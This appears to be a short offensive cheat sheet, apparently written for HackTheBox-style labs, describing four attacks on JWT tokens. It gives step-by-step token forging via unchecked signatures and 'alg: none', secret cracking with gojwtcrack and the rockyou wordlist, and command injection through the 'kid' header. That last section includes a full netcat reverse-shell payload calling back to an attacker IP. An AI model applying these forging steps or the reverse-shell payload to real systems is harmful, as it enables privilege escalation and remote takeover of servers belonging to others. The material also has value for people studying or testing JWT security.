Some of the useful attacks that targets the JWT token can be resumed here.

# Missing Signature Verification
This attack happens when the back-end doesn't verify the signature(aka the "third part" of the token) which is used for validation of the token with the senders private key, this step can involve into tampering of the cookie in our favor.

IF we have this:
```
{
  "name": "HTBJWT",
  "value": 1337,
  "admin": false
}
```
We could tamper from: https://jwt.io
With something similar:
```
{
  "name": "HTBJWT",
  "value": 1337,
  "admin": true
}
```
If back-end fails into checking the signature this could lead to security breach and PE of our user to Admin rights.

# None Algorithm Attack
This attack happens when we tamper the **"alg=none"** into the signature(aka the "first part" of the token) and this lead to the back-end bypassing the signature check for authenticity.
If we have this:
```
{
  "alg": "HS256",
  "typ": "JWT"
}
{
"sub": "1234567890",
"iat": 1516239022,
"admin":false
}
```
We could tamper:
1)Decode this from https://jwt.io 
```
{
  "alg": "HS256",
  "typ": "JWT"
}
```
2)Take the HEADER part of the token **ex: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9**
3)Base64 decode in Cyberchef
4)Form your payload to match:
```
{"alg": "none","typ": "JWT"}
```
5)Base64 encode(omit the = symbols from the encoding) back and replace the original HEADER in the JWT token. 
6)Remove the SIGNATURE aka the "third part" of the token
6)Resulting in(DO NOT FORGET THE LAST dot): **HEADER.DATA.**


# Weak Secret
As the title says this attack happens when the secret(from the SIGNATURE) used to sign the token is weak, thus can be brute-forced.
You can crack it by:
1)Install GoJwtCrack: go install github.com/x1sec/gojwtcrack@latest
2)`echo "eyJhbGci....SNIP...33STKB89JsY" > tokens.txt`
3)`gojwtcrack -t tokens.txt -d /usr/share/wordlists/rockyou.txt`
4)Get the secret from the step 3 and forge a new token with your data from http://jwt.io/


# Insecure KID Parameter
This attack can happen when the KID parameter is insecurely managed and can lead to a RCE. But the KID aka KEYID is a optional header used to identify which key is used to sign the token, this is usefull if you have several keys used for signing several tokens so you know which one is used with wich...
### Structure?
It should look like something similar. In this case default.key have been used for signing
```
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "default.key"
}
```
How to identify?
1)Fuzz some strange chars into kid header and craft a new token, something like...
```
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "\"'(){}[]&;/'(}{'Â£%^"
}
```
2)If the back-end answer with an error like `""success":false,"msg":"/bin/sh: syntax error: unexpected \"(\"\n"}" then you might be able to gain RCE`
3)Prepare your RCE, OBS: structure will be ( `"kid":"default.key\";PAYLOADHERE"` ):
```
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "default.key\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <TUN0 IP> 9001 >/tmp/f;\""
}
```
4)Base64 encode and replace into the HEADER and PROFIT!
